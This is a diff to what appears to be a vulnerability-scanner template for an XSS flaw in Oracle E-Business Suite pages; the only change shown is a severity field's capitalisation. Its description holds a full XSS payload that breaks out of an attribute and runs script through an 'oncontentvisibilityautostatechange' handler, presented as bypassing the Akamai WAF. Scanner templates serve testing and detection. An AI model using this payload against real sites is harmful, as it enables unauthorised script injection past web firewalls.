@@ -3,7 +3,7 @@ id: xss-oracle
 info:
   name: XSS Vulnerability with bypass Akamai WAF 8/11/2024
   author: 111xnagashy
-  severity: medium
+  severity: Medium
   description: This template checks for an XSS vulnerability in the hidden input field where the 'oncontentvisibilityautostatechange' attribute is used full payload "\"></div><input type=\"hidden\" oncontentvisibilityautostatechange=\"confirm('MrAli')\" style=\"content-visibility:auto>".
   tags: xss, WAF bypass, oa_html
 
